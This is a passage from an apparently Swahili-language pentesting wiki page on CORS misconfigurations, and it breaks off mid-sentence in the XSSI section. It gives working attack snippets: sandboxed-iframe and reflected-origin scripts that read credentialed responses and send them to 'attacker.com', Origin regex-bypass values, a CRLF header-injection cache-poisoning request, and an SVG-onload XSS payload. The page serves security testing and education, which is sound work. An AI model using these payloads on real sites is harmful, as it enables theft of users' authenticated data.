# CORS - Makosa ya Mipangilio & Kupita

{{#include ../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## CORS ni nini?

Cross-Origin Resource Sharing (CORS) standard **inawawezesha seva kufafanua nani anaweza kufikia mali zao** na **ni njia zipi za ombi la HTTP zinazoruhusiwa** kutoka vyanzo vya nje.

Sera ya **same-origin** inahitaji kwamba **seva inayotaka** rasilimali na seva inayohifadhi **rasilimali** zishiriki itifaki sawa (mfano, `http://`), jina la kikoa (mfano, `internal-web.com`), na **bandari** (mfano, 80). Chini ya sera hii, ni kurasa za wavuti kutoka kikoa na bandari sawa pekee ndizo zinazoruhusiwa kufikia rasilimali hizo.

Matumizi ya sera ya same-origin katika muktadha wa `http://normal-website.com/example/example.html` yanaonyeshwa kama ifuatavyo:

| URL iliyofikiwa                              | Ufikiaji unaruhusiwa?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Ndio: Mpango, kikoa, na bandari sawa |
| `http://normal-website.com/example2/`     | Ndio: Mpango, kikoa, na bandari sawa |
| `https://normal-website.com/example/`     | Hapana: Mpango na bandari tofauti           |
| `http://en.normal-website.com/example/`   | Hapana: Kikoa tofauti                    |
| `http://www.normal-website.com/example/`  | Hapana: Kikoa tofauti                    |
| `http://normal-website.com:8080/example/` | Hapana: Bandari tofauti\*                    |

\*Internet Explorer inapuuzilia mbali nambari ya bandari katika kutekeleza sera ya same-origin, hivyo kuruhusu ufikiaji huu.

### `Access-Control-Allow-Origin` Header

Header hii inaweza kuruhusu **vyanzo vingi**, thamani ya **`null`**, au wildcard **`*`**. Hata hivyo, **hakuna kivinjari kinachounga mkono vyanzo vingi**, na matumizi ya wildcard `*` yanakabiliwa na **mipaka**. (Wildcard lazima itumike peke yake, na matumizi yake pamoja na `Access-Control-Allow-Credentials: true` hayaruhusiwi.)

Header hii **inatolewa na seva** kama jibu la ombi la rasilimali ya kuvuka kikoa lililoanzishwa na tovuti, huku kivinjari kikiongeza kiotomatiki header ya `Origin`.

### `Access-Control-Allow-Credentials` Header

Kwa **kawaida**, maombi ya kuvuka kikoa yanafanywa bila akidi kama vile vidakuzi au header ya Uidhinishaji. Hata hivyo, seva ya kuvuka kikoa inaweza kuruhusu kusoma jibu wakati akidi zinatumwa kwa kuweka header ya `Access-Control-Allow-Credentials` kuwa **`true`**.

Ikiwa imewekwa kuwa `true`, kivinjari kitaweza kutuma akidi (vidakuzi, headers za uidhinishaji, au vyeti vya mteja vya TLS).
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText)
}
}
xhr.open("GET", "http://example.com/", true)
xhr.withCredentials = true
xhr.send(null)
```

```javascript
fetch(url, {
credentials: "include",
})
```

```javascript
const xhr = new XMLHttpRequest()
xhr.open("POST", "https://bar.other/resources/post-here/")
xhr.setRequestHeader("X-PINGOTHER", "pingpong")
xhr.setRequestHeader("Content-Type", "application/xml")
xhr.onreadystatechange = handler
xhr.send("<person><name>Arun</name></person>")
```
### CSRF Pre-flight request

### Understanding Pre-flight Requests in Cross-Domain Communication

Wakati wa kuanzisha ombi la kuvuka eneo chini ya hali maalum, kama vile kutumia **non-standard HTTP method** (chochote isipokuwa HEAD, GET, POST), kuanzisha **headers** mpya, au kutumia **Content-Type header value** maalum, ombi la pre-flight linaweza kuhitajika. Ombi hili la awali, linalotumia njia ya **`OPTIONS`**, linatumika kuarifu seva kuhusu nia za ombi la kuvuka eneo linalokuja, ikiwa ni pamoja na njia za HTTP na headers ambazo linakusudia kutumia.

Itifaki ya **Cross-Origin Resource Sharing (CORS)** inahitaji ukaguzi huu wa pre-flight ili kubaini uwezekano wa operesheni ya kuvuka eneo iliyohitajika kwa kuthibitisha njia, headers, na uaminifu wa chanzo. Kwa ufahamu wa kina wa hali zipi zinaweza kuondoa hitaji la ombi la pre-flight, rejelea mwongozo wa kina ulioandikwa na [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).

Ni muhimu kutambua kwamba **ukosefu wa ombi la pre-flight hauondoi hitaji la jibu kubeba authorization headers**. Bila headers hizi, kivinjari hakiwezi kushughulikia jibu kutoka kwa ombi la kuvuka eneo.

Fikiria mfano ufuatao wa ombi la pre-flight lililokusudia kutumia njia ya `PUT` pamoja na header maalum inayoitwa `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
Katika majibu, seva inaweza kurudisha vichwa vinavyoashiria mbinu zilizokubaliwa, asili iliyoidhinishwa, na maelezo mengine ya sera ya CORS, kama inavyoonyeshwa hapa chini:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
- **`Access-Control-Allow-Headers`**: Kichwa hiki kinaeleza ni vichwa gani vinaweza kutumika wakati wa ombi halisi. Kimewekwa na seva kuashiria vichwa vinavyoruhusiwa katika maombi kutoka kwa mteja.
- **`Access-Control-Expose-Headers`**: Kupitia kichwa hiki, seva inamjulisha mteja ni vichwa gani vinaweza kufichuliwa kama sehemu ya jibu mbali na vichwa vya jibu rahisi.
- **`Access-Control-Max-Age`**: Kichwa hiki kinaonyesha ni muda gani matokeo ya ombi la pre-flight yanaweza kuhifadhiwa. Seva inaweka muda wa juu, kwa sekunde, ambao taarifa iliyorejeshwa na ombi la pre-flight inaweza kutumika tena.
- **`Access-Control-Request-Headers`**: Inayotumika katika maombi ya pre-flight, kichwa hiki kimewekwa na mteja kuijulisha seva ni vichwa gani vya HTTP ambavyo mteja anataka kutumia katika ombi halisi.
- **`Access-Control-Request-Method`**: Kichwa hiki, pia kinachotumika katika maombi ya pre-flight, kimewekwa na mteja kuashiria ni njia gani ya HTTP itakayokuwa ikitumika katika ombi halisi.
- **`Origin`**: Kichwa hiki kimewekwa kiotomatiki na kivinjari na kinaonyesha asili ya ombi la cross-origin. Kinatumika na seva kutathmini ikiwa ombi linalokuja linapaswa kuruhusiwa au kukataliwa kulingana na sera ya CORS.

Kumbuka kwamba kawaida (kutegemea aina ya maudhui na vichwa vilivyowekwa) katika **ombio la GET/POST hakuna ombi la pre-flight linalotumwa** (ombio linatumwa **moja kwa moja**), lakini ikiwa unataka kufikia **vichwa/mwili wa jibu**, lazima iwe na kichwa _Access-Control-Allow-Origin_ kinachoruhusu.\
**Hivyo, CORS hailindi dhidi ya CSRF (lakini inaweza kuwa na msaada).**

### **Maombi ya Mtandao wa Mitaa Ombi la Pre-flight**

1. **`Access-Control-Request-Local-Network`**: Kichwa hiki kimejumuishwa katika ombi la mteja kuashiria kwamba uchunguzi unalenga rasilimali ya mtandao wa ndani. Kinatumika kama alama kuijulisha seva kwamba ombi linatoka ndani ya mtandao wa ndani.
2. **`Access-Control-Allow-Local-Network`**: Katika majibu, seva zinatumia kichwa hiki kuwasiliana kwamba rasilimali iliyohitajika inaruhusiwa kushirikiwa na vyombo vya nje ya mtandao wa ndani. Kinatumika kama mwanga wa kijani kwa kushiriki rasilimali kati ya mipaka tofauti ya mtandao, kuhakikisha ufikiaji ulio na udhibiti huku ukihifadhi itifaki za usalama.

Jibu **halali linaloruhusu ombi la mtandao wa ndani** linahitaji kuwa na pia katika jibu kichwa `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
> [!WARNING]
> Kumbuka kwamba IP ya linux **0.0.0.0** inafanya kazi ili **bypass** mahitaji haya ya kufikia localhost kwani anwani hiyo ya IP haichukuliwi kama "ya ndani".
>
> Pia inawezekana **bypass the Local Network requirements** ikiwa utatumia **anwani ya IP ya umma ya mwisho wa ndani** (kama anwani ya IP ya umma ya router). Kwa sababu katika matukio kadhaa, hata kama **IP ya umma** inafikiwa, ikiwa ni **kutoka kwenye mtandao wa ndani**, ufikiaji utawezesha.

### Wildcards

Kumbuka kwamba hata kama usanidi ufuatao unaweza kuonekana kuwa na ruhusa nyingi:
```bash
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
Hii haiwezekani na vivinjari na kwa hivyo akidi hazitapelekwa na ombi lililokubaliwa na hili.

## Mipangilio isiyofaa inayoweza kutumika

Imeonekana kwamba kuweka `Access-Control-Allow-Credentials` kuwa **`true`** ni sharti la awali kwa mashambulizi mengi **halisi**. Mipangilio hii inaruhusu kivinjari kutuma akidi na kusoma jibu, ikiongeza ufanisi wa shambulizi. Bila hii, faida ya kufanya kivinjari kutoa ombi badala ya kufanya hivyo mwenyewe inapungua, kwani kutumia vidakuzi vya mtumiaji inakuwa vigumu.

### Tofauti: Kutumia Mahali pa Mtandao kama Uthibitisho

Kuna tofauti ambapo mahali pa mtandao wa mwathirika hutenda kama aina ya uthibitisho. Hii inaruhusu kivinjari cha mwathirika kutumika kama proxy, ikiepuka uthibitisho wa IP ili kufikia programu za intranet. Njia hii ina fanana katika athari na DNS rebinding lakini ni rahisi kutekeleza.

### Kureflect `Origin` katika `Access-Control-Allow-Origin`

Hali halisi ambapo thamani ya kichwa cha `Origin` inareflectwa katika `Access-Control-Allow-Origin` ni ya nadharia isiyowezekana kutokana na vizuizi vya kuunganisha vichwa hivi. Hata hivyo, wabunifu wanaotafuta kuwezesha CORS kwa URL nyingi wanaweza kuunda kichwa cha `Access-Control-Allow-Origin` kwa njia ya kidinamikia kwa kunakili thamani ya kichwa cha `Origin`. Njia hii inaweza kuleta udhaifu, hasa wakati mshambuliaji anatumia domain yenye jina lililoundwa kuonekana halali, hivyo kudanganya mantiki ya uthibitishaji.
```html
<script>
var req = new XMLHttpRequest()
req.onload = reqListener
req.open("get", "https://example.com/details", true)
req.withCredentials = true
req.send()
function reqListener() {
location = "/log?key=" + this.responseText
}
</script>
```
### Kutumia `null` Origin

`null` origin, iliyoainishwa kwa hali kama vile redirects au faili za HTML za ndani, ina nafasi ya kipekee. Programu zingine zinaorodhesha origin hii ili kuwezesha maendeleo ya ndani, bila kukusudia kuruhusu tovuti yoyote kuiga `null` origin kupitia iframe iliyo sanduku, hivyo kupita vizuizi vya CORS.
```html
<iframe
sandbox="allow-scripts allow-top-navigation allow-forms"
src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe
sandbox="allow-scripts allow-top-navigation allow-forms"
srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Mbinu za Kupita Mifumo ya Kuangalia

Wakati wa kukutana na orodha ya maeneo yaliyoruhusiwa, ni muhimu kujaribu fursa za kupita, kama vile kuongeza eneo la mshambuliaji kwenye eneo lililoruhusiwa au kutumia udhaifu wa kuchukua subdomain. Zaidi ya hayo, mifumo ya kawaida inayotumika kwa uthibitishaji wa maeneo inaweza kupuuzilia mbali tofauti katika kanuni za kutaja maeneo, ikitoa fursa zaidi za kupita.

### Kupita kwa Mifumo ya Kawaida ya Kuangalia

Mifumo ya Regex kawaida inazingatia wahusika wa alphanumeric, nukta (.), na hyphen (-), ikipuuzilia mbali uwezekano mwingine. Kwa mfano, jina la eneo lililotengenezwa kuhusisha wahusika wanaotafsiriwa tofauti na vivinjari na mifumo ya regex linaweza kupita ukaguzi wa usalama. Ushughulikiaji wa wahusika wa underscore katika subdomains na Safari, Chrome, na Firefox unaonyesha jinsi tofauti hizo zinaweza kutumika ili kuzunguka mantiki ya uthibitishaji wa maeneo.

**Kwa maelezo zaidi na mipangilio ya ukaguzi huu wa kupita:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **na** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png](<../images/image (284).png>)

### Kutoka XSS ndani ya subdomain

Wakuu wa programu mara nyingi wanatekeleza mitambo ya kujihami ili kulinda dhidi ya matumizi mabaya ya CORS kwa kuorodhesha maeneo ambayo yanaruhusiwa kuomba taarifa. Licha ya tahadhari hizi, usalama wa mfumo sio wa kuaminika. Uwepo wa subdomain moja tu iliyo hatarini ndani ya maeneo yaliyoruhusiwa unaweza kufungua mlango wa matumizi mabaya ya CORS kupitia udhaifu mwingine, kama vile XSS (Cross-Site Scripting).

Ili kuonyesha, fikiria hali ambapo eneo, `requester.com`, limeorodheshwa ili kufikia rasilimali kutoka eneo lingine, `provider.com`. Mipangilio ya upande wa seva inaweza kuonekana kama ifuatavyo:
```javascript
if ($_SERVER["HTTP_HOST"] == "*.requester.com") {
// Access data
} else {
// Unauthorized access
}
```
Katika mpangilio huu, subdomain zote za `requester.com` zinaruhusiwa kupata. Hata hivyo, ikiwa subdomain, sema `sub.requester.com`, imeathiriwa na udhaifu wa XSS, mshambuliaji anaweza kutumia udhaifu huu. Kwa mfano, mshambuliaji mwenye ufikiaji wa `sub.requester.com` anaweza kutumia udhaifu wa XSS ili kupita sera za CORS na kwa uovu kufikia rasilimali kwenye `provider.com`.

### **Makarakteri Maalum**

PortSwiggerâ€™s [URL validation bypass cheat sheet](https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet) iligundua kuwa baadhi ya vivinjari vinasaidia wahusika wa ajabu ndani ya majina ya kikoa.

Chrome na Firefox vinasaidia viwango vya chini `_` ambavyo vinaweza kupita regexes zilizotekelezwa kuthibitisha kichwa cha `Origin`:
```
GET / HTTP/2
Cookie: <session_cookie>
Origin: https://target.application_.arbitrary.com
```

```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://target.application_.arbitrary.com
Access-Control-Allow-Credentials: true
```
Safari ni mwepesi zaidi kukubali wahusika maalum katika jina la kikoa:
```
GET / HTTP/2
Cookie: <session_cookie>
Origin: https://target.application}.arbitrary.com
```

```
HTTP/2 200 OK
Cookie: <session_cookie>
Access-Control-Allow-Origin: https://target.application}.arbitrary.com
Access-Control-Allow-Credentials: true
```
### **Njia nyingine za kufurahisha za URL**

{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

### **Uchafuzi wa cache upande wa seva**

[**Kutoka utafiti huu**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Inawezekana kwamba kwa kutumia uchafuzi wa cache upande wa seva kupitia sindano ya kichwa cha HTTP, udhaifu wa Cross-Site Scripting (XSS) unaweza kuanzishwa. Hali hii inatokea wakati programu inashindwa kusafisha kichwa cha `Origin` kwa wahusika haramu, ikisababisha udhaifu hasa kwa watumiaji wa Internet Explorer na Edge. Mablua haya yanachukulia (0x0d) kama mterminator halali ya kichwa cha HTTP, na kusababisha udhaifu wa sindano ya kichwa cha HTTP.

Fikiria ombi lifuatalo ambapo kichwa cha `Origin` kinamanipulika:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer na Edge hufasiri jibu kama:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Wakati wa kutumia moja kwa moja udhaifu huu kwa kufanya kivinjari cha wavuti kutuma kichwa kisichofaa hakufai, ombi lililotengenezwa linaweza kuundwa kwa mikono kwa kutumia zana kama Burp Suite. Njia hii inaweza kusababisha cache ya upande wa seva kuhifadhi jibu na bila kukusudia kulihudumia wengine. Payload iliyoundwa inalenga kubadilisha seti ya wahusika wa ukurasa kuwa UTF-7, ambayo ni uandishi wa wahusika mara nyingi inahusishwa na udhaifu wa XSS kutokana na uwezo wake wa kuandika wahusika kwa njia inayoweza kutekelezwa kama script katika muktadha fulani.

Kwa kusoma zaidi kuhusu udhaifu wa XSS uliohifadhiwa, angalia [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Kumbuka**: Kutumia udhaifu wa sindano ya kichwa cha HTTP, hasa kupitia sumu ya cache ya upande wa seva, kunasisitiza umuhimu wa kuthibitisha na kusafisha kila pembejeo inayotolewa na mtumiaji, ikiwa ni pamoja na vichwa vya HTTP. Daima tumia mfano thabiti wa usalama unaojumuisha uthibitisho wa pembejeo ili kuzuia udhaifu kama huu.

### **Sumu ya cache ya upande wa mteja**

[**Kutoka utafiti huu**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Katika hali hii, mfano wa ukurasa wa wavuti unaonyesha maudhui ya kichwa maalum cha HTTP bila uandishi sahihi unakabiliwa. Kwa haswa, ukurasa wa wavuti unarudisha maudhui yaliyojumuishwa katika kichwa `X-User-id`, ambacho kinaweza kujumuisha JavaScript mbaya, kama inavyoonyeshwa na mfano ambapo kichwa kina tag ya picha ya SVG iliyoundwa kutekeleza msimbo wa JavaScript wakati wa kupakia.

Sera za Kushiriki Rasilimali za Mipaka (CORS) zinaruhusu kutumwa kwa vichwa maalum. Hata hivyo, bila jibu kutolewa moja kwa moja na kivinjari kutokana na vizuizi vya CORS, matumizi ya sindano kama hiyo yanaweza kuonekana kuwa na mipaka. Kitu muhimu kinatokea wakati wa kuzingatia tabia ya cache ya kivinjari. Ikiwa kichwa `Vary: Origin` hakijabainishwa, inakuwa inawezekana kwa jibu mbaya kuhifadhiwa na kivinjari. Baadaye, jibu hili lililohifadhiwa linaweza kuonyeshwa moja kwa moja wakati wa kuhamasisha URL, kupita hitaji la uwasilishaji wa moja kwa moja wakati wa ombi la awali. Mekanismu hii inaboresha uaminifu wa shambulio kwa kutumia cache ya upande wa mteja.

Ili kuonyesha shambulio hili, mfano wa JavaScript unapatikana, ulioandaliwa kutekelezwa katika mazingira ya ukurasa wa wavuti, kama kupitia JSFiddle. Skripti hii inafanya kitendo rahisi: inatuma ombi kwa URL maalum ikiwa na kichwa maalum kinachojumuisha JavaScript mbaya. Baada ya kukamilika kwa ombi kwa mafanikio, inajaribu kuhamasisha URL ya lengo, huenda ikasababisha utekelezaji wa skripti iliyosambazwa ikiwa jibu limehifadhiwa bila kushughulikia ipasavyo kichwa `Vary: Origin`.

Hapa kuna muhtasari wa JavaScript inayotumika kutekeleza shambulio hili:
```html
<script>
function gotcha() {
location = url
}
var req = new XMLHttpRequest()
url = "https://example.com/" // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha
req.open("get", url, true)
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
req.send()
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, pia inajulikana kama Cross-Site Script Inclusion, ni aina ya udhaifu inayotumia ukweli kwamba Sera ya Asili Moja (SOP) haitumiki wakati wa kujumuisha rasilimali kwa kutumia tag ya script. Hii ni kwa sababu scripts zinahitaji kuweza kujumuishwa kutoka kwa maeneo tofauti. Udhaifu huu unaruhusu mshambuliaji kufikia na kusoma maudh
